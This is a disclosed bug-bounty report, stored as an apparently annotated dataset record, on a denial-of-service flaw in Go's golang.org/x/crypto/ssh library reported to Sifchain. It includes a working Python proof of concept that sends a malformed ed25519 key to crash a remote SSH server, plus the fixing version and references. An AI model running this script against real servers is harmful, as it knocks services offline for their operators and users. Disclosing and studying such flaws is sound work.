{
  "reported_to": "Sifchain",
  "reported_by": "dpredrag ",
  "title": "Signature Verification /// golang.org/x/crypto/ssh",
  "content": "\nSummary:\nCrypto package are vulnerable to Improper Signature Verification \"\nAn attacker can craft an ssh-ed25519 or sk-ssh-...@openssh.com public key, such that the library will panic when trying to verify a signature with it. Clients can deliver such a public key and signature to any golang.org/x/crypto/ssh server with a PublicKeyCallback, and servers can deliver them to any golang.org/x/crypto/ssh client \"\nIntroduced through: github.com/Sifchain/sifnode@0.0.0 \u203a golang.org/x/crypto@v0.0.0-20201016220609-9e8e0b390897\nIntroduced through: github.com/Sifchain/sifnode@0.0.0 \u203a github.com/tyler-smith/go-bip39@v1.1.0 \u203a golang.org/x/crypto@v0.0.0-20200622213623-75b288015ac9\nand few more I can provide more points if needed\n<image_0>\nSteps To Reproduce:\n1 . python poc.py localhost 2022 root (or x.x.x.x depends on setup)\npoc.py\nCode 1.13 KiB\n1# This should cause a panic on the remote server.\n2#\n3\n4#!/usr/bin/env python\n5\n6import socket\n7import sys\n8\n9import paramiko\n10from paramiko.common import cMSG_SERVICE_REQUEST, cMSG_USERAUTH_REQUEST\n11\n12if len(sys.argv) != 4:\n13    print('./poc.py <host> <port> <user>')\n14    sys.exit(1)\n15\n16host = sys.argv[1]\n17port = int(sys.argv[2])\n18user = sys.argv[3]\n19\n20sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n21sock.connect((host, port))\n22\n23t = paramiko.Transport(sock)\n24t.start_client()\n25\n26t.lock.acquire()\n27m = paramiko.Message()\n28m.add_byte(cMSG_SERVICE_REQUEST)\n29m.add_string(\"ssh-userauth\")\n30t._send_message(m)\n31\n32m = paramiko.Message()\n33m.add_byte(cMSG_USERAUTH_REQUEST)\n34m.add_string(user)\n35m.add_string(\"ssh-connection\")\n36m.add_string('publickey')\n37m.add_boolean(True)\n38m.add_string('ssh-ed25519')\n39\n40# Send an SSH key that is too short (ed25519 keys are 32 bytes)\n41m.add_string(b'\\x00\\x00\\x00\\x0bssh-ed25519\\x00\\x00\\x00\\x15key-that-is-too-short')\n42\n43# Send an empty signature (the server won't get far enough to validate it)\n44m.add_string(b'\\x00\\x00\\x00\\x0bssh-ed25519\\x00\\x00\\x00\\x00')\n45\n46t._send_message(m)\n47\n48print('Malformed auth request sent. This should cause a panic on the remote server.')\nThis can be fixed by upgrading to golang.org/x/crypto@0.0.0-20201203163018-be400aefbc4c\nSupporting Material/References:\nhttps://groups.google.com/g/golang-announce/c/3L45YRc91SY\nhttps://github.com/golang/crypto/commit/bac4c82f69751a6dd76e702d54b3ceb88adab236\nImpact\nSummary\n\n",
  "severity": [
    7.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cryptographic Issues - Generic"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fwdl47pxwea8k0g2nu3xoi65ma4e?response-content-disposition=attachment%3B%20filename%3D%22screencapture-github-golang-crypto-commit-bac4c82f69751a6dd76e702d54b3ceb88adab236-2021-07-23-20_42_26.png%22%3B%20filename%2A%3DUTF-8%27%27screencapture-github-golang-crypto-commit-bac4c82f69751a6dd76e702d54b3ceb88adab236-2021-07-23-20_42_26.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7ZUEQGGO%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T165658Z&X-Amz-Expires=2027&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD4STlU4%2BNmtv4xSA7CnG%2F%2B2oZWdUUQJe4X3xSHayijHAIhAJAsKM88apsDkKx5hkUNKMxulgSGKFA%2BnL3m4kOji%2Bz%2BKrIFCBQQAxoMMDEzNjE5Mjc0ODQ5Igwl6oW5HwJYfJ5HyBQqjwUrCG701eH3crmqaG6Ux9NRICOzqS5da8JeWuiszPrcMcCYhL2XMjari%2F%2FhHS9H5TsjqrVN6RGyVyZ1sgp%2BbB22PZKgethvwyDkGHiamdfddqrDIf06zwaDbG3D9uR2juQe7%2BMQEsLky9al1CKBmXVP3wDy8819TPvxKZEt1Yj4vEtD6eCsPw5QC9z3AObymjm5shmmDGgioyBFipHTVfJ2lXmedDdSFKOmzW94ERMlIOPWjRLVA8WtY%2FWk9i56jfYkpyackEmBJnb3YSOiBnX%2B8ZW2oOwJUSyqpZKj3EYAOhfJwZCY%2BSXjloKNMBN4dZEyZnQmeCG09ioC85ro97m77TYfabhCtF%2BAZwJW1gNDS5h9ffVIolA2r9ystP%2FvhjExYsQCe4ZMeq7DH5AxkSHXrcSItZW9iwBfftKfCOCVC3lfLJWHQID7Sk%2F%2BJhDOHK8tfQlTVpFO9cG58KbsTGsgXD21A7SUzLRvVi1u7kQBrWlX4e2rvz98E3WtEdc%2BS0UVQLJmERNz0R9YxF%2BbBTsVDdg9%2BQJ39J7yoWJTJhSnURVLGw0ZUWbMz60iKSJ2M8mx%2Barmh3dBaJ793tU72llUWIi2959Ibe%2F2mqkwNfjZ8PXA0PaHZBGAqJK0h3ZmTdeRBIE5rIQpQ9BeaOvnRR1QTLmBTIHDdzDeYPpnphRnEXTu%2FQ2q6enKLIllqyuPqmEBwO96PYNKEY9jBY%2Fn8shM3YKHWUIYtCBW%2BTtfh2vuB1pqtuiOqUvwBEDY1W78rTLMPzeSOylh3TYoGL%2F76JyKykXLkJvSAWcezniafmFak4iBBKGW1Zn%2FC0NvCJ%2FvtJ75T1IRY8c5lU5Wg2h84YNl2QnMD%2FVmOYjxz0IupGC0MIOiir8GOrABbWj59w2oK9QOlHEN%2BGT1SVG85Vkd9Z9vQ6YAwaVXq844yCSH9R%2F%2FaEGm8afuNiJ1AetZXuW9qVXFba06h4IybtaeUiBGvTej70DQqeC3moHEUc%2B2ghF0zIpn%2BV2W2%2Bkr8AivU6OYJVEleI7LIZkxC8G4B3TAwCtI8ms0ZvoiiBxZ%2FIYWsX9AYFFtU340PldCQfAEZUDSp%2FZ%2F9XeC4Cl4iRJrqnjzRKEW%2FIZIaPkEq3A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ee6f242eaa8f5f39a4333d6857204ce6d5cb6191c6e935b1c3b9eb20d9624367"
  },
  "disclosed_date": 1639089840,
  "report_url": "https://hackerone.com/reports/1276384",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Set up a connection to the target SSH server using a Python script that sends a malformed SSH public key and signature."
    ],
    [
      2,
      "Observe the server's response; it should panic due to improper signature verification when processing the crafted key."
    ]
  ],
  "vuln_description": "The vulnerability involves improper signature verification in the golang.org/x/crypto/ssh package, where an attacker can craft a malformed ssh-ed25519 or sk-ssh-...@openssh.com public key, causing the library to panic during signature verification. This can be exploited by clients or servers in SSH connections to disrupt service.",
  "reason": "The attack requires crafting a specific malformed SSH key and signature, which is a straightforward process once the flaw in the signature verification logic is understood. The interaction between the components (key and signature) is simple, and the application state manipulation is minimal.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}